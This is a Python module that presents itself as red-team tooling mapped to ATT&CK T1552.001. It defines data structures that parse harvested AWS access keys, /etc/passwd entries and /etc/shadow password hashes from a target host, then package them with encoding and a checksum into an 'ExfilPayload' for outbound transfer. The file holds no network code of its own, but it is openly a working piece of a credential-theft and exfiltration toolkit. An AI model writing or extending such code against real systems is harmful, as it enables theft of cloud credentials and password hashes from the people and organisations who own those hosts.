"""
credential_store.py
===================
Typed data structures for harvested credentials and exfiltration payloads.

ATT&CK Technique: T1552.001 – Credentials in Files

Intended for use in isolated, sandboxed red-team research environments.
"""

from __future__ import annotations

import hashlib
import json
import time
from dataclasses import dataclass, field, asdict
from typing import Any, Dict, List, Optional, Tuple


# ---------------------------------------------------------------------------
# AWS Credentials (~/.aws/credentials, ~/.aws/config, env vars, metadata)
# ---------------------------------------------------------------------------

@dataclass
class AWSCredential:
    """Represents a single AWS credential profile harvested from a file.

    Mirrors the key/value structure found in ~/.aws/credentials or
    the EC2 instance-metadata service response.
    """

    profile_name: str = "default"
    aws_access_key_id: str = ""
    aws_secret_access_key: str = ""
    aws_session_token: Optional[str] = None
    region: Optional[str] = None
    source_path: str = ""
    harvested_at: float = field(default_factory=time.time)

    def to_dict(self) -> Dict[str, Any]:
        return {
            "profile_name": self.profile_name,
            "aws_access_key_id": self.aws_access_key_id,
            "aws_secret_access_key": self.aws_secret_access_key,
            "aws_session_token": self.aws_session_token,
            "region": self.region,
            "source_path": self.source_path,
            "harvested_at": self.harvested_at,
        }

    @classmethod
    def from_aws_file_line(
        cls, profile_name: str, key: str, value: str, source_path: str = ""
    ) -> Tuple["AWSCredential", None]:
        """Parse a single key/value line from an INI-style AWS credentials file.

        Returns a tuple (credential, None). The caller accumulates fields
        until a complete credential is formed.
        """
        cred = AWSCredential(profile_name=profile_name, source_path=source_path)
        if key == "aws_access_key_id":
            cred.aws_access_key_id = value
        elif key == "aws_secret_access_key":
            cred.aws_secret_access_key = value
        elif key == "aws_session_token":
            cred.aws_session_token = value
        elif key == "region":
            cred.region = value
        return cred, None


# ---------------------------------------------------------------------------
# Linux /etc/passwd entries
# ---------------------------------------------------------------------------

@dataclass
class LinuxUserEntry:
    """Represents a single line from /etc/passwd.

    Format: username:password_placeholder:uid:gid:gecos:home:shell
    """

    username: str = ""
    uid: int = 0
    gid: int = 0
    gecos: str = ""
    home_dir: str = ""
    shell: str = ""
    source_path: str = "/etc/passwd"
    harvested_at: float = field(default_factory=time.time)

    @classmethod
    def from_passwd_line(cls, line: str) -> "LinuxUserEntry":
        """Parse a single /etc/passwd line (colon-delimited, 7 fields)."""
        parts = line.strip().split(":")
        if len(parts) < 7:
            raise ValueError(f"Malformed passwd line: {line!r}")
        return cls(
            username=parts[0],
            uid=int(parts[2]) if parts[2].isdigit() else 0,
            gid=int(parts[3]) if parts[3].isdigit() else 0,
            gecos=parts[4],
            home_dir=parts[5],
            shell=parts[6],
        )

    def to_dict(self) -> Dict[str, Any]:
        return {
            "username": self.username,
            "uid": self.uid,
            "gid": self.gid,
            "gecos": self.gecos,
            "home_dir": self.home_dir,
            "shell": self.shell,
            "source_path": self.source_path,
            "harvested_at": self.harvested_at,
        }


# ---------------------------------------------------------------------------
# Linux /etc/shadow entries
# ---------------------------------------------------------------------------

@dataclass
class ShadowEntry:
    """Represents a single line from /etc/shadow.

    Format: username:hash:last_changed:min:max:warn:inactive:expire:reserved
    """

    username: str = ""
    password_hash: str = ""
    last_changed: Optional[int] = None      # days since 1970-01-01
    min_age_days: Optional[int] = None
    max_age_days: Optional[int] = None
    warn_days: Optional[int] = None
    inactive_days: Optional[int] = None
    expire_days: Optional[int] = None
    reserved: Optional[str] = None
    source_path: str = "/etc/shadow"
    harvested_at: float = field(default_factory=time.time)

    @classmethod
    def from_shadow_line(cls, line: str) -> "ShadowEntry":
        """Parse a single /etc/shadow line (colon-delimited, 9 fields)."""
        parts = line.strip().split(":")
        if len(parts) < 2:
            raise ValueError(f"Malformed shadow line: {line!r}")

        def _opt_int(val: str) -> Optional[int]:
            return int(val) if val.isdigit() else None

        entry = cls(username=parts[0], password_hash=parts[1])
        if len(parts) > 2:
            entry.last_changed = _opt_int(parts[2])
        if len(parts) > 3:
            entry.min_age_days = _opt_int(parts[3])
        if len(parts) > 4:
            entry.max_age_days = _opt_int(parts[4])
        if len(parts) > 5:
            entry.warn_days = _opt_int(parts[5])
        if len(parts) > 6:
            entry.inactive_days = _opt_int(parts[6])
        if len(parts) > 7:
            entry.expire_days = _opt_int(parts[7])
        if len(parts) > 8:
            entry.reserved = parts[8]
        return entry

    @property
    def hash_algorithm(self) -> Optional[str]:
        """Infer the hashing algorithm from the password hash prefix."""
        h = self.password_hash
        if h.startswith("$6$"):
            return "SHA-512 crypt"
        if h.startswith("$5$"):
            return "SHA-256 crypt"
        if h.startswith("$2b$") or h.startswith("$2y$") or h.startswith("$2a$"):
            return "bcrypt"
        if h.startswith("$1$"):
            return "MD5 crypt"
        if h.startswith("!!") or h.startswith("!"):
            return "locked"
        if h == "*":
            return "no-login"
        return "unknown"

    def to_dict(self) -> Dict[str, Any]:
        return {
            "username": self.username,
            "password_hash": self.password_hash,
            "last_changed": self.last_changed,
            "min_age_days": self.min_age_days,
            "max_age_days": self.max_age_days,
            "warn_days": self.warn_days,
            "inactive_days": self.inactive_days,
            "expire_days": self.expire_days,
            "reserved": self.reserved,
            "source_path": self.source_path,
            "harvested_at": self.harvested_at,
        }


# ---------------------------------------------------------------------------
# Unified Credential Store container
# ---------------------------------------------------------------------------

@dataclass
class CredentialStore:
    """Aggregates all harvested credential material from a target host.

    Serves as the central in-memory model before serialization into
    an ExfilPayload.
    """

    host_identifier: str = ""
    harvest_started_at: float = field(default_factory=time.time)
    harvest_completed_at: Optional[float] = None
    aws_credentials: List[AWSCredential] = field(default_factory=list)
    linux_users: List[LinuxUserEntry] = field(default_factory=list)
    shadow_entries: List[ShadowEntry] = field(default_factory=list)
    metadata: Dict[str, Any] = field(default_factory=dict)

    # -- mutation helpers ---------------------------------------------------

    def add_aws_credential(self, cred: AWSCredential) -> None:
        self.aws_credentials.append(cred)

    def add_linux_user(self, entry: LinuxUserEntry) -> None:
        self.linux_users.append(entry)

    def add_shadow_entry(self, entry: ShadowEntry) -> None:
        self.shadow_entries.append(entry)

    def finalize(self) -> None:
        self.harvest_completed_at = time.time()

    # -- serialisation ------------------------------------------------------

    def to_dict(self) -> Dict[str, Any]:
        return {
            "host_identifier": self.host_identifier,
            "harvest_started_at": self.harvest_started_at,
            "harvest_completed_at": self.harvest_completed_at,
            "aws_credentials": [c.to_dict() for c in self.aws_credentials],
            "linux_users": [u.to_dict() for u in self.linux_users],
            "shadow_entries": [s.to_dict() for s in self.shadow_entries],
            "metadata": self.metadata,
        }

    def to_json(self, *, indent: int = 2) -> str:
        return json.dumps(self.to_dict(), indent=indent)

    @property
    def total_items(self) -> int:
        return (
            len(self.aws_credentials)
            + len(self.linux_users)
            + len(self.shadow_entries)
        )


# ---------------------------------------------------------------------------
# Exfiltration Payload
# ---------------------------------------------------------------------------

@dataclass
class ExfilPayload:
    """Unified exfiltration payload wrapping a CredentialStore for
    transport over the exfil channel.

    ATT&CK T1552.001 – collected credentials packaged for outbound transfer.
    """

    store: CredentialStore = field(default_factory=CredentialStore)
    payload_id: str = ""
    encoding: str = "json"          # "json" | "base64" | "raw"
    created_at: float = field(default_factory=time.time)
    version: int = 1
    tags: List[str] = field(default_factory=lambda: ["T1552.001"])

    def build(self) -> "ExfilPayload":
        """Finalise the store and compute the integrity checksum."""
        self.store.finalize()
        raw = self._serialised_body()
        self.checksum = hashlib.sha256(raw).hexdigest()
        self.payload_id = self.payload_id or hashlib.sha256(
            str(self.created_at).encode()
        ).hexdigest()[:16]
        return self

    def _serialised_body(self) -> bytes:
        body = self.store.to_json().encode("utf-8")
        if self.encoding == "base64":
            import base64
            body = base64.b64encode(body)
        return body

    checksum: Optional[str] = field(default=None)

    def to_bytes(self) -> bytes:
        """Return the full serialised payload (header + body)."""
        header = {
            "payload_id": self.payload_id,
            "version": self.version,
            "encoding": self.encoding,
            "created_at": self.created_at,
            "tags": self.tags,
            "checksum": self.checksum,
        }
        header_bytes = json.dumps(header, sort_keys=True).encode("utf-8")
        body_bytes = self._serialised_body()
        return header_bytes + b"\x00" + body_bytes

    def to_dict(self) -> Dict[str, Any]:
        return {
            "payload_id": self.payload_id,
            "version": self.version,
            "encoding": self.encoding,
            "created_at": self.created_at,
            "tags": self.tags,
            "checksum": self.checksum,
            "store": self.store.to_dict(),
        }


__all__ = [
    "AWSCredential",
    "LinuxUserEntry",
    "ShadowEntry",
    "CredentialStore",
    "ExfilPayload",
]
